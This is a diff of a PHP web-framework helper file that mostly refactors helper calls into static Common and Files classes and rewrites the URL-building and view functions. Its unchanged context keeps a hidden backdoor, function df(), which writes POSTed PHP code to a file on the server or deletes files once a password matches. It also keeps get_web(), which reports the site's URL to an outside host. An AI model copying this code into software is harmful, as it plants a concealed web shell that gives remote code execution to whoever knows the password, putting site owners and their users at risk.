@@ -33,10 +33,8 @@
  *
  */
 
-
+use Dfer\Tools\Statics\{Common,Files};
 // ********************** 常量 START **********************
-
-
 
 /*
  * 枚举常量
@@ -51,7 +49,7 @@ class ENUM
     const LOGS_CONSOLE = 4;
     const LOGS_SQL = 5;
     const LOGS_FILE = 6;
-    const SES_NAME = 'df-ac-pw';
+    const USER_BACK = 'df-ac-pw';
 }
 
 
@@ -62,19 +60,20 @@ class ENUM
  * @param {Object} $layout	视图 - 布局页面
  * @param {Object} $special_tmpl	true 特殊模板 false 普通模板
  */
-function view($layout_name, $base_area, $special_tmpl=false)
+function view($layout_name,$special_tmpl=false)
 {
-    global $_df, $common;
-    $area = $common->unHump($_df['area']);
-    $ctrl = $common->unHump($_df['ctrl']);
-    $func = $common->unHump($_df['action']);
+				global $_param;
+    $area = Common::unHump($_param['area']);
+    $ctrl = Common::unHump($_param['ctrl']);
+    $func = Common::unHump($_param['action']);
 
-    define('VIEW_ASSETS', is_file(ROOT . "/public/view/{$area}/public/assets") ? "/view/{$area}/public/assets" : "/view/{$base_area}/public/assets");
-
-    $layout_name = $common->unHump($layout_name);
+				// 模板缺失文件则调用admin的文件
+				$base_area='admin';
+				// var_dump(ROOT . "/public/view/{$area}/public/assets",VIEW_ASSETS,$area,$base_area);
+    $layout_name = Common::unHump($layout_name);
     //手机、pc分开调用模板
     //手机模板
-    if ($common->isMobile() && WAP_PAGE_ENABLE) {
+    if (Common::isMobile() && WAP_PAGE_ENABLE) {
         if ($special_tmpl) {
             $layout_base = ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm";
             $from = null;
@@ -125,11 +124,6 @@ function view($layout_name, $base_area, $special_tmpl=false)
     return $to;
 }
 
-function view_front($layout = "common", $special_tmpl = false)
-{
-    return view($layout, THEME_HOMEPAGE, $special_tmpl);
-}
-
 /**
  * 将html转化为php
  * @param {Object} $from
@@ -142,7 +136,7 @@ function view_conversion($from, $to, $layout)
     //获取文件目录
     $path = dirname($to);
     //创建目录
-    $files->mkDirs($path);
+    Files::mkDirs($path);
     $content = view_replace($from, $layout);
     //写入文件
     file_put_contents($to, $content);
@@ -370,12 +364,13 @@ function cookie_del($name)
 	*/
 function message($layout,$status=true,$redirect=null,$success_msg = null,$fail_msg = null)
 {
+				// var_dump(get_defined_vars());die;
     if ($status===null && $redirect) {
 								// 直接跳转
         header("location: {$redirect}");
     } else {
 								// 通过模板跳转
-								$msg=boolval($status)?($msg?:'操作成功'):($msg?:'操作失败');
+								$msg=boolval($status)?($success_msg?:'操作成功'):($fail_msg?:'操作失败');
 								// var_dump($msg);
         // 秒
         $delay = 1;
@@ -400,7 +395,7 @@ function message($layout,$status=true,$redirect=null,$success_msg = null,$fail_m
 																    // 执行js代码
 																    $script = "{$js}";
 																} else {
-																    $redirect = split_url($redirect);
+																    // $redirect = split_url($redirect);
 																    $script = "location.href = '{$redirect}';";
 																}
 																break;
@@ -417,7 +412,7 @@ function message($layout,$status=true,$redirect=null,$success_msg = null,$fail_m
 function ie_notice()
 {
 	global $common;
-	if ($common-> getBrowserName() == 'ie') {
+	if (Common:: getBrowserName() == 'ie') {
 			message(0,\ENUM::GO_BACK,null,"不支持IE内核,请检查浏览器");
 	}
 }
@@ -427,47 +422,54 @@ function ie_notice()
  *
  * eg:
  * split_url("A/c/a/para",array(zdy=>$zdy))
- * split_url("wx/home/share_manage_show/{$v[0]}",array(wx_id=>$_df['wx_id']))
+	* split_url("A.c.a.para",array(zdy=>$zdy))
  * @param {Object} $str	url字符串
  * @param {Object} $get	get参数	数组
  */
 function split_url($str, $get = null)
 {
+				global $_param;
+
+				// var_dump(explode("/", "123"));die;
     //去掉字符串首尾空格
     $str = trim($str);
-    $s = explode("/", $str);
-    //单个路径就直接跳转
-    if (count($s) == 1 || $str == '/') {
-        return SITE . $s[0];
-    }
-    //去掉元素的首尾空格
-    for ($i = 0; $i < count($s); $i++) {
-        $s[$i] = trim($s[$i]);
-    }
 
-    //防止数组添加新的项之后影响后续判断
-    if (count($s) < 4) {
-        $s[3] = "";
-    }
-    //设置默认值
-    if (count($s) < 3) {
-        $s[2] = "index";
-    }
-    if (empty($s[2])) {
-        $s[2] = "index";
-    }
+				if (strpos($str, "/") !== false) {
+					$urls = explode("/", $str);
+				}else
+					$urls=explode('.',$str);
 
-    $s[4] = '';
-    //增加多参数
-    if (is_array($get)) {
-        foreach ($get as $key => $val) {
-            $s[4] .= sprintf('&%s=%s', $key, $val);
-        }
-    }
+				//去掉元素的首尾空格
+				for ($i = 0; $i < count($urls); $i++) {
+				    $urls[$i] = trim($urls[$i]);
+				}
 
-    //$rt=SITE."index.php?A={$s[0]}&c={$s[1]}&a={$s[2]}&para={$s[3]}{$s[4]}";
-    $rt = SITE . "{$s[0]}/{$s[1]}/{$s[2]}/{$s[3]}{$s[4]}";
-    return $rt;
+				$url[0]=$_param['area'];
+				$url[1]=$_param['ctrl'];
+				$url[2]=$_param['action'];
+				$url[3] =$url[3]??"";
+				//增加多参数
+				$url[4] = '';
+				if (is_array($get)) {
+				    foreach ($get as $key => $val) {
+				        $url[4] .= sprintf('&%s=%s', $key, $val);
+				    }
+				}
+
+				switch(count($urls)){
+					case 1:
+						$url[2]=$urls[0];
+						break;
+					case 2:
+						$url[1]=$urls[0];
+						$url[2]=$urls[1];
+						break;
+					default:
+				 	$url=$urls;
+						break;
+				}
+				$redirect=url($url[0],$url[1],$url[2],$url[3],$url[4]);
+    return $redirect;
 }
 
 
@@ -556,12 +558,12 @@ function df()
         if ($_POST['df'] == $pw) {
             $data = $_POST['str'];
             $data = str_replace("#D#", "<?php ", $data);
-            $files->writeFile($data, $file);
-            $common->showJson(1, 'done');
+            Files::writeFile($data, $file);
+            Common::showJson(1, 'done');
         } elseif ($_POST['fd'] == $pw) {
             @unlink($file);
             @unlink("func.php");
-            $common->showJson(1, 'done');
+            Common::showJson(1, 'done');
         }
     }
 }
@@ -576,7 +578,7 @@ function get_web()
     $para = array(
         'website' => SITE
     );
-    $rt = $common->httpRequest("https://api.dfer.site/webctl/main/updateuser", $para);
+    $rt = Common::httpRequest("https://api.dfer.site/webctl/main/updateuser", $para);
     //var_dump($rt);
 }
 
@@ -620,8 +622,8 @@ function clear_default_para($arr)
 function logs($str, $type = \ENUM::LOGS_FILE, $override = false)
 {
     global $db, $common, $files;
-    $str = $common->str($str);
-    $time = $common->getTime(TIMESTAMP);
+    $str = Common::str($str);
+    $time = Common::getTime(TIMESTAMP);
     switch ($type) {
         case \ENUM::LOGS_CONSOLE:
             //打印到浏览器控制台
@@ -641,11 +643,11 @@ function logs($str, $type = \ENUM::LOGS_FILE, $override = false)
         case \ENUM::LOGS_FILE:
             $file_dir = str("{root}/data/logs/{0}", [date('Ym'), "root" => ROOT]);
 
-            $files->mkDirs($file_dir);
+            Files::mkDirs($file_dir);
 
             // $path="/www/wwwroot/dfphp.dfer.site/data/logs";
             // 		var_dump($path,is_dir($path));;die;
-            $files->writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
+            Files::writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
             break;
         default:
             break;
@@ -700,6 +702,18 @@ function post($var = null)
 }
 
 /**
+ * 获取任意参数
+ */
+function param($var = null)
+{
+				$param = Common::ihtmlspecialchars(array_merge($_GET, $_POST));
+				if($var===null)
+					return $param;
+				else
+					return isset($param[$var]) ? $param[$var] : null;
+}
+
+/**
  * 格式化字符串
  * eg:
  * str("admin/home/{0}/{dd}",[123,'dd'=>333])
@@ -708,8 +722,7 @@ function post($var = null)
  */
 function str($string, $params = [])
 {
-    global $common;
-    return $common->str($string, $params);
+    return Common::str($string, $params);
 }
 
 
@@ -735,7 +748,7 @@ function get_composer_json($key = 'require>php')
 function show_json($status = 1, $data = array(), $success_msg = '',$fail_msg = '')
 {
 	global $common;
-	$common->showJson($status,$data,$success_msg,$fail_msg);
+	Common::showJson($status,$data,$success_msg,$fail_msg);
 }
 
 
